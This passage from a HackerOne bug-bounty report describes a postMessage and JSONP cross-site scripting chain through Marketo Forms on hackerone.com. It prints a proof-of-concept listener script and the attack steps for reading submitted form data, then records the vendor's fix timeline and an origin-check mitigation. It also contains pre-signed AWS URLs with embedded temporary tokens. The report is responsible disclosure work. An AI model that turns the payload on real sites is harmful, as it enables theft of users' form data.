1000);\n})()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen victim clicks the link, we start a interval of \u003ccode\u003epostMessage\u003c/code\u003e-sending to \u003ccode\u003eb[\u0026#39;frames\u0026#39;][0]\u003c/code\u003e which should be the Marketo iframe on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Interesting enough, Marketo actually sets the name of the frame to \u003ccode\u003emktoFormsXDIframe + Math.random()\u003c/code\u003e but this can be completely bypassed using \u003ccode\u003ewindow[\u0026#39;frames\u0026#39;][0]\u003c/code\u003e instead.\u003c/p\u003e\n\n\u003cp\u003eOur code in \u003ccode\u003ejsonp2.php\u003c/code\u003e looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Access-Control-Allow-Origin: *\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n(function(){\n    if(window.icanhazmsg) return\n    window.icanhazmsg=true\n    window.onmessage=function(a) {\n        if(a.origin.indexOf(\u0026#39;marketo\u0026#39;) !== -1) return;\n        console.log(a);\n        alert(\u0026quot;I HAVE YOUR DATA NOW\\n\u0026quot; + a.data)\n    }\n})()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs you see, we now use the XSS passed from our springboard-iframe to the iframe on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to register a listener to pop an alert when data is submitted in the form.\u003c/p\u003e\n\n\u003cp\u003eGetting the victim to submit the form, will result in the infamous popup:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-02-17_at_05.07.40.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/523/ca85724b4b8f55fb5d57daecb86fb41fc32894ff/Screen_Shot_2017-02-17_at_05.07.40.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-02-17_at_05.07.40.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-02-17_at_05.07.40.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045527Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=620ecd0a47e062fa1652322e2e5057a38024911b46975776ad02e60ee62225dd\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/523/ca85724b4b8f55fb5d57daecb86fb41fc32894ff/Screen_Shot_2017-02-17_at_05.07.40.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-02-17_at_05.07.40.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-02-17_at_05.07.40.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045527Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=620ecd0a47e062fa1652322e2e5057a38024911b46975776ad02e60ee62225dd\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSo, what we did was the following:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAttacker\u0026#39;s page -\u0026gt; Marketo iframe\u003c/li\u003e\n\u003cli\u003epostMessage from Marketo iframe -\u0026gt; Attacker\u0026#39;s page\u003c/li\u003e\n\u003cli\u003eAttacker\u0026#39;s page -\u0026gt; postMessage loading JSONP -\u0026gt; Marketo iframe\u003c/li\u003e\n\u003cli\u003eCreate link on Marketo iframe -\u0026gt; start sending postMessage\u003c/li\u003e\n\u003cli\u003eLink opens \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in new tab, triggers contact form to show using \u003ccode\u003e#contact\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eSends over postMessage from opener. XSS register listener in Marketo iframe\u003c/li\u003e\n\u003cli\u003eVictim submits form, XSS reads data\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"conclusion\"\u003eConclusion\u003c/h3\u003e\n\n\u003cp\u003eI played around a bit with this issue and came to the following conclusion:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eMarketo Forms doesn\u0026#39;t use any origin-checks of the postMessage sent to their Cross Origin Frame. This is most likely because the whole point with the frame is to communicate with any page that uses Marketo. This is probably per design.\u003c/li\u003e\n\u003cli\u003eMarketo Forms allows a bit too much flexibility for the page sending the postMessage. It\u0026#39;s actually just throwing in a complete object called \u003ccode\u003eajaxParams\u003c/code\u003e directly into \u003ccode\u003e$.ajax()\u003c/code\u003e. This results in the XSS on \u003ccode\u003eapp-*.marketo.com\u003c/code\u003e. I think this is the best thing to patch up properly, not allowing full control over these params, especially not the \u003ccode\u003ejsonp\u003c/code\u003e-mode of jQuery.\u003c/li\u003e\n\u003cli\u003eIn HackerOne\u0026#39;s case, no data is handled sent from the \u003ccode\u003eerror\u003c/code\u003e and \u003ccode\u003esuccess\u003c/code\u003e functions being triggered when the form is posted which most likely saves HackerOne from getting a proper XSS on their own domain. However, since the data submitted in the form is still passed through the iframe, data can still be stolen using this technique.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nFrans\u003c/p\u003e\n","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":161523,"file_name":"Screen_Shot_2017-02-17_at_05.07.40.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/523/ca85724b4b8f55fb5d57daecb86fb41fc32894ff/Screen_Shot_2017-02-17_at_05.07.40.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-02-17_at_05.07.40.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-02-17_at_05.07.40.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045527Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=620ecd0a47e062fa1652322e2e5057a38024911b46975776ad02e60ee62225dd","file_size":177714,"type":"image/png"},{"id":161524,"file_name":"Marketo2.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/524/83a4181295e9a3b278da51a657f26637c5872b77/Marketo2.mp4?response-content-disposition=attachment%3B%20filename%3D%22Marketo2.mp4%22%3B%20filename%2A%3DUTF-8%27%27Marketo2.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045527Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=c14756b6ca7cc1602c383811d4bb0f215477d433e0c389fc53482c7e87374cec","file_size":3852036,"type":"video/mp4"}],"allow_singular_disclosure_at":"2017-09-23T12:02:13.857Z","allow_singular_disclosure_after":-103049593.23453438,"singular_disclosure_allowed":true,"vote_count":137,"voters":["flamezzz","bleg","pajoda","smsecurity","sp1d3rs","yxw21","jr0ch17","cache-money","kapytein","europa","and 127 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1490858,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, @fransrosen. I just opened a case with Marketo about this issue, and I'll keep you in the loop.\n\nBesides removing their forms code, is there anything you see that we could do in the mean time to mitigate this from our perspective?","markdown_message":"\u003cp\u003eThanks, \u003ca href=\"/fransrosen\"\u003e@fransrosen\u003c/a\u003e. I just opened a case with Marketo about this issue, and I\u0026#39;ll keep you in the loop.\u003c/p\u003e\n\n\u003cp\u003eBesides removing their forms code, is there anything you see that we could do in the mean time to mitigate this from our perspective?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-17T08:23:13.838Z","updated_at":"2017-02-17T08:23:13.838Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1490900,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @reed! Short answer: No.\n\nLong answer:\nYou could perhaps use a modified script instead of theirs, since their endpoint always responds with `Access-Control-Allow-Origin:*`, so the XDFrame could be created in a different context still sending data to it. \n\nThat would need you to:\n1. Have your own `forms2.min.js` located on for example a `hackerone-ext-content.com`-domain.\n2. Modify that script to load a different XDFrame also on `hackerone-ext-content.com`.\n3. That XDFrame could then either be locked down completely by you:\n    \n    ```js\n$(window).on(\"message\", function (e){\n          var origin = e.originalEvent.origin;\n          if(origin != \"https://www.hackerone.com\") return\n    ```\n    \n4. Which would make `postMessage` only work from your own origin.\n\nI think a future proper mitigation would be for Marketo to get the script to pass an origin to the XDFrame when the script is initalized, which would then be checked against the `origin` in the postMessage to only allow the original origin to talk with it.\n\nHope this helps.\n\nRegards,\nFrans","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/reed\"\u003e@reed\u003c/a\u003e! Short answer: No.\u003c/p\u003e\n\n\u003cp\u003eLong answer:\u003cbr\u003e\nYou could perhaps use a modified script instead of theirs, since their endpoint always responds with \u003ccode\u003eAccess-Control-Allow-Origin:*\u003c/code\u003e, so the XDFrame could be created in a different context still sending data to it. \u003c/p\u003e\n\n\u003cp\u003eThat would need you to:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eHave your own \u003ccode\u003eforms2.min.js\u003c/code\u003e located on for example a \u003ccode\u003ehackerone-ext-content.com\u003c/code\u003e-domain.\u003c/li\u003e\n\u003cli\u003eModify that script to load a different XDFrame also on \u003ccode\u003ehackerone-ext-content.com\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThat XDFrame could then either be locked down completely by you:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emessage\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n      \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eorigin\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalEvent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eorigin\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eorigin\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://www.hackerone.com\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWhich would make \u003ccode\u003epostMessage\u003c/code\u003e only work from your own origin.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI think a future proper mitigation would be for Marketo to get the script to pass an origin to the XDFrame when the script is initalized, which would then be checked against the \u003ccode\u003eorigin\u003c/code\u003e in the postMessage to only allow the original origin to talk with it.\u003c/p\u003e\n\n\u003cp\u003eHope this helps.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nFrans\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-17T08:55:36.073Z","updated_at":"2017-02-17T08:55:36.073Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1506072,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-26T04:24:52.931Z","updated_at":"2017-02-26T04:24:52.931Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1518425,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Frans!\n\nJust touching base, wanted to let you know we were still trucking away on this. \n\nThanks!\n\n\nEvan","markdown_message":"\u003cp\u003eHey Frans!\u003c/p\u003e\n\n\u003cp\u003eJust touching base, wanted to let you know we were still trucking away on this. \u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n\n\u003cp\u003eEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-03T22:30:11.207Z","updated_at":"2017-03-03T22:30:11.207Z","actor":{"username":"ebrynne","cleared":false,"url":"/ebrynne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/191/f333df32e9b61845f5c823b77d968fa6d246d336_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1551858,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @fransrosen,\n\nWe're currently awaiting a response from Marketo, sorry for delay!\n\nCheers,\nDirk","markdown_message":"\u003cp\u003eHey \u003ca href=\"/fransrosen\"\u003e@fransrosen\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re currently awaiting a response from Marketo, sorry for delay!\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nDirk\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-20T10:52:44.626Z","updated_at":"2017-03-20T10:52:44.626Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1569661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Marketo is still working on this. I'll poke them again.","markdown_message":"\u003cp\u003eMarketo is still working on this. I\u0026#39;ll poke them again.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-29T07:47:50.129Z","updated_at":"2017-03-29T07:47:50.129Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1646072,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Spoke to Marketo, and their ETA for a fix is late June during their next major update. Sounds like this \"fix\" will be opt-in as well, as apparently, customers rely on this security issue. We'll keep this open until it's resolved, though.","markdown_message":"\u003cp\u003eSpoke to Marketo, and their ETA for a fix is late June during their next major update. Sounds like this \u0026quot;fix\u0026quot; will be opt-in as well, as apparently, customers rely on this security issue. We\u0026#39;ll keep this open until it\u0026#39;s resolved, though.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-01T08:19:15.915Z","updated_at":"2017-05-01T08:19:15.915Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1655893,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks guys for the updates! Looking forward into getting this resolved.\n\nCheers,\nFrans","markdown_message":"\u003cp\u003eThanks guys for the updates! Looking forward into getting this resolved.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nFrans\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-05T07:41:48.852Z","updated_at":"2017-05-05T07:41:48.852Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1667337,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Marketo provided this update today:\n\n\u003e Our Engineering team has confirmed that they are updating our systems to allow customers to set custom CORS headers for their landing pages and forms.\n\u003e\n\u003e The planned release is currently set for our Q2 release. \n\u003e\n\u003e You can track the release via:\n\u003e http://docs.marketo.com/display/public/DOCS/2017+Release+Schedule\n\n@fransrosen, do you feel that allowing us to disable CORS for their 